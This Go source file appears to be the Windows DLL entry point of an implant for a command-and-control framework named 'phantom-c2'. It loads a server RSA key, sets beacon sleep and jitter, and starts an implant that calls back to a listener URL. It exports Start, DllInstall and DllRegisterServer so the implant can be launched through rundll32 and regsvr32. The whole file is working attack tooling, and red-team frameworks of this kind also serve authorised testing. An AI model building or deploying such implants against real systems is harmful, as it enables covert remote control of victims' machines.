//go:build windows

package main

/*
#include <windows.h>
*/
import "C"

import (
	"crypto/rsa"
	"strconv"

	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/implant"
)

func startAgent() {
	sleepSec, _ := strconv.Atoi(implant.SleepSeconds)
	if sleepSec <= 0 {
		sleepSec = 10
	}
	jitterPct, _ := strconv.Atoi(implant.JitterPercent)
	if jitterPct < 0 || jitterPct > 50 {
		jitterPct = 20
	}

	var serverPubKey *rsa.PublicKey
	if implant.ServerPubKey != "" {
		keyBytes, err := crypto.Base64Decode(implant.ServerPubKey)
		if err == nil {
			pub, err := crypto.PublicKeyFromBytes(keyBytes)
			if err == nil {
				serverPubKey = pub
			}
		}
	}
	if serverPubKey == nil {
		pub, err := crypto.LoadPublicKey("configs/server.pub")
		if err == nil {
			serverPubKey = pub
		}
	}
	if serverPubKey == nil {
		return
	}

	implant.Run(implant.ListenerURL, serverPubKey, sleepSec, jitterPct, implant.KillDate)
}

// Start is called via: rundll32.exe phantom.dll,Start
//
//export Start
func Start() {
	go startAgent()
}

// DllInstall is called via: regsvr32 /s /i phantom.dll
//
//export DllInstall
func DllInstall() {
	go startAgent()
}

// DllRegisterServer is called via: regsvr32 phantom.dll
//
//export DllRegisterServer
func DllRegisterServer() C.HRESULT {
	go startAgent()
	return 0 // S_OK
}

func main() {}
